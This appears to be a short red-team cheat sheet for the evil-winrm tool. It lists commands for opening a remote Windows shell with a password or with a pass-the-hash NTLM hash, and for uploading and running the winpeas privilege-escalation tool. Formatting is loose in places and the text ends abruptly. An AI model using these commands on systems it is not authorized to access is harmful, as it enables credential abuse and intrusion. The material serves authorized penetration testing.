# evil-winrm

Interactive WinRM shell — the standard for Windows remote access in red team ops.

## Quick Start

```bash
# Connect with password
evil-winrm -i 192.168.1.10 -u administrator -p Password123

# Pass-the-hash (NTLM)
evil-winrm -i 192.168.1.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117

# With SSL (port 5986)
evil-winrm -i 192.168.1.10 -u admin -p Password123 -S
```

evil-winrm -i 10.10.10.10 -u administrator -H "8846f7eaee8fb117ad06bdd830b7586c"

# Upload a tool and execute
evil-winrm -i 10.10.10.10 -u admin -p pass -e /opt/tools/
# Inside shell:
# upload /opt/tools/winpeas.exe
# ./winpeas.exe

# Load custom PS scripts
